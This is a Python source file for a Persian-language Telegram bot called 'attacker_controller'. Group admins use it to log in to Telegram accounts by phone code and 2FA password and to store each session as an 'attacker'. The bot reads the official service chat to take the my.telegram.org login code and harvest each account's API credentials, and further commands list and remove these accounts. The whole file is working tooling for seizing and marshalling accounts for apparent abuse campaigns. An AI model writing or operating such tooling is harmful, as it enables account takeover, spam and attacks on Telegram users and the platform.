import os
import re

from decouple import config
from pyrogram import Client, filters
from pyrogram.errors.exceptions import (
    FloodWait, PhoneCodeExpired,
    SessionPasswordNeeded, PhoneCodeEmpty,
    PhoneNumberInvalid, BadRequest,
    PasswordHashInvalid,
)
from pyrogram.types import Message

from attacker_controller import MAIN_ADMINS
from attacker_controller.utils import storage, auth
from attacker_controller.utils.custom_filters import admin

ATTACKERS = {}

app = Client(
    'attacker_controller/sessions/attacker_controller',
    api_id=config('api_id', cast=int),
    api_hash=config('api_hash'),
    bot_token=config('bot_token'),
)


def _remove_attacker_session(session_name):
    """
    Remove a attacker session by given session name.
    Return boolean that shows the file removed or no.
    """
    try:
        os.remove(f'attacker_controller/sessions/attackers/{session_name}.session')
    except FileNotFoundError:
        return False

    return True


async def _get_api_id_and_api_hash(phone):
    """
    Get api id and api hash by given phone.
    """

    async def _error(err_reason):
        # await ATTACKERS[phone].logout()
        del ATTACKERS[phone]
        _remove_attacker_session(phone)
        return (
            'خطایی هنگام گرفتن api id و api hash به وجود آمد و اکانت لاگ اوت شد.\n'
            'دلیل خطا:\n{}'.format(err_reason)
        )

    # now its time to get account api id and api hash from https://my.telegram.org
    res = await auth.send_password(phone)
    if not res[0]:
        # sending password was failed
        return await _error(res[1])

    # get password from official telegram bot chat history
    last_message = await ATTACKERS[phone].get_history(777000, limit=1)
    web_password = re.match(r'.*This is your login code:\n(.*)\n', last_message[0].text).group(1)
    res = await auth.login(phone, web_password)

    if not res[0]:
        # logging to web was failed
        return await _error(res[1])
    else:
        return 'فرایند به اتمام رسید و {}'.format(res[1])


# admin setting commands
@app.on_message(
    filters.regex(r'^\/addadmin (\d+(?:\s+\d+)*)$') &
    filters.group &
    ~filters.edited &
    filters.user(MAIN_ADMINS)
)
async def add_admin(client: Client, message: Message):
    """ Add the given chat ids to the admin list. """
    users_chat_id = message.matches[0].group(1).split()
    await storage.add_admin(*users_chat_id)
    await message.reply_text('چت ایدی های داده شده به لیست ادمین‌ها اضافه شد.')


@app.on_message(
    filters.regex(r'^\/removeadmin (\d+(?:\s+\d+)*)$') &
    filters.group &
    ~filters.edited &
    filters.user(MAIN_ADMINS)
)
async def remove_admin(client: Client, message: Message):
    """ Remove the given chat ids from the admin list.  """
    users_chat_id = message.matches[0].group(1).split()
    await storage.remove_admin(*users_chat_id)
    await message.reply_text('چت ایدی های داده شده از لیست ادمین‌ها حذف شد.')


@app.on_message(
    filters.command('adminlist') &
    filters.group &
    ~filters.edited &
    filters.user(MAIN_ADMINS)
)
async def admin_list(client: Client, message: Message):
    """ Return list of current admins. """
    admins_chat_id = '\n'.join(await storage.get_admins())
    text = (
        'لیست چت ایدی ادمین‌های فعلی ربات:\n\n'
        f'{admins_chat_id}'
    )
    await message.reply_text(text)


# attacker authentication
@app.on_message(
    filters.regex(r'^\/sendcode (\+\d+)$') &
    filters.group &
    ~filters.edited &
    admin
)
async def send_code(client: Client, message: Message):
    """
    Send Login code to given phone number.
    """
    phone = message.matches[0].group(1)
    msg = await message.reply_text('درحال ارسال درخواست. لطفا صبر کنید...')

    ATTACKERS[phone] = Client(
        f'attacker_controller/sessions/attackers/{phone}',
        api_id=config('api_id', cast=int),
        api_hash=config('api_hash'),
    )
    await ATTACKERS[phone].connect()
    try:
        sent_code = await ATTACKERS[phone].send_code(phone)
        # todo: show sending type
    except FloodWait as e:
        await msg.edit('ارسال درخواست با محدودیت مواجه شده است. لطفا {} ثانیه دیگر امتحان کنید.'.format(e.x))
        _remove_attacker_session(phone)
    except PhoneNumberInvalid:
        await msg.edit('شماره وارد شده نادرست است.')
        _remove_attacker_session(phone)
    else:
        # store phone code hash for one minute
        await storage.redis.set(f'phone_code_hash:{phone}', sent_code.phone_code_hash, 60)
        await msg.edit('کد ارسال شد.')

    await ATTACKERS[phone].disconnect()


@app.on_message(
    filters.regex(r'^\/login (\+\d+) (.+)$') &
    filters.group &
    ~filters.edited &
    admin
)
async def login_attacker(client: Client, message: Message):
    """
    Login to account by provided credentials.
    """
    phone = message.matches[0].group(1)
    phone_code_hash = await storage.redis.get(f'phone_code_hash:{phone}') or ''

    args = message.matches[0].group(2).split()
    code, password = args[0], None
    if len(args) == 2:
        password = args[1]

    msg = await message.reply_text('درحال لاگین با اطلاعات داده شده...')

    await ATTACKERS[phone].connect()
    try:
        await ATTACKERS[phone].sign_in(phone, phone_code_hash, code)
    except (PhoneCodeExpired, PhoneCodeEmpty):
        await msg.edit('کد منقضی یا اشتباه است.')
    except SessionPasswordNeeded:
        if password is not None:
            try:
                await ATTACKERS[phone].check_password(password)
            except (PasswordHashInvalid, BadRequest):
                await msg.edit('پسورد اشتباه است!')
            else:
                await msg.edit(await _get_api_id_and_api_hash(phone))
        else:
            await msg.edit('اکانت دارای پسورد می‌باشد. لطفا پسورد را بعد از کد با یک فاصله ارسال کنید.')
    except KeyError:
        await msg.edit('مطمئن باشید قبل از لاگین به اکانت درخواست ارسال کد را کرده اید.')
    else:
        await msg.edit(await _get_api_id_and_api_hash(phone))

    await storage.redis.delete(f'phone_code_hash:{phone}')
    await ATTACKERS[phone].disconnect()


# attacker setting commands
@app.on_message(
    filters.command('attackerlist') &
    filters.group &
    ~filters.edited &
    admin
)
async def attacker_list(client: Client, message: Message):
    """
    Get list of attackers phone.
    """
    text = 'لیست اتکرها : \n\n'
    attackers = await storage.get_attackers()
    for attacker in attackers:
        text += '`{}`\n\n'.format(attacker)
    await message.reply_text(text)


@app.on_message(
    filters.regex(r'^\/removeattacker (\+\d+)$') &
    filters.group &
    ~filters.edited &
    admin
)
async def remove_attacker(client: Client, message: Message):
    """
    Remove given phone from attacker list.
    """
    phone = message.matches[0].group(1)
    await storage.remove_attacker(phone)
    _remove_attacker_session(phone)
    await message.reply_text('شماره داده شده از لیست اتکر‌ها حذف شد.')


app.run()
